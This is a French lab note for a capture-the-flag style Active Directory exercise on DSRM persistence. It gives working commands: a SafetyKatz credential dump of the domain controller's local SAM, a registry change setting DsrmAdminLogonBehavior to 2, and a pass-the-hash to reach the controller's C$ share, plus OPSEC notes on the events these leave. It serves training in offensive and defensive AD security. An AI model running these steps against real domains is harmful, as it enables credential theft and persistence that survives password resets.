---
flag: 20
machine: dcorp-dc
statut: à faire
technique: DSRM persistence
LO: [[LO11 - Persistance DSRM]]
---

# F20 · Clé registre logon DSRM

> [!summary] Objectif
> Identifier la valeur de registre à modifier sur le DC pour autoriser le compte DSRM à se connecter par le réseau (Pass-the-Hash).

## Contexte
- **Etape attack flow** : persistence hors-domaine — le compte DSRM est un admin **local** du DC (mode Directory Services Restore), indépendant de tout reset de mot de passe de domaine (y compris `Administrator` et `krbtgt`).
- **Ce qu on a** : privilèges DA + accès SYSTEM sur le DC pour dumper le SAM local.
- **Ce qu on cherche** : le nom de la valeur (REG_DWORD) sous `HKLM\System\CurrentControlSet\Control\Lsa` qui contrôle le comportement de logon de l administrateur DSRM.

## Solution

### Etape 1 — Dumper le hash NTLM DSRM depuis le SAM local du DC
Depuis une session SYSTEM sur le DC :
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
```
→ Voir [[Cheatsheet - Persistence]] (section DSRM).

### Etape 2 — Modifier la clé registre pour autoriser le logon réseau du DSRM
Valeur : **`DsrmAdminLogonBehavior`** (REG_DWORD, valeur `2` = autoriser le logon réseau avec le compte DSRM local en permanence).
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

### Etape 3 — Pass-the-Hash avec le compte DSRM (Administrator local du DC)
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<A REMPLIR DEPUIS LAB> /run:powershell.exe" "exit"
# depuis le nouveau shell (contexte Administrator local du DC) :
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

## Reponse

| Element | Valeur |
|---------|--------|
| Nom de la clé de registre | **`DsrmAdminLogonBehavior`** |
| Chemin complet | `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` |
| Type / valeur | `REG_DWORD` = `2` |
| Hash NTLM DSRM (Administrator local) | <A REMPLIR DEPUIS LAB> |

## Pieges et OPSEC
- **Pass-the-Hash, pas OverPass** — le compte DSRM est **local** au DC, pas un compte de domaine ; OverPass (Kerberos) échouerait.
- Bien préciser `/domain:dcorp-dc` (nom de la machine) dans `sekurlsa::pth`, pas le nom du domaine AD.
- Valeur `2` = logon réseau autorisé en permanence ; valeur `1` = seulement si le DC est en mode DSRM (inutile pour la persistance).
- Traces : modification de `HKLM\System\CurrentControlSet\Control\Lsa` → event **4657** (audit registre si activé) ; dump SAM → event **4663** / signatures EDR sur `lsadump::sam`.
- Persistance qui survit à un reset de `krbtgt` / `Administrator` de domaine — l atout majeur vs Golden/Diamond.

## Refs
- [[Cheatsheet - Persistence]]
- [[Cheatsheet - Tickets Kerberos]]
- [[LO11 - Persistance DSRM]]

[[Flags - Index]] · [[Journal - Index]]
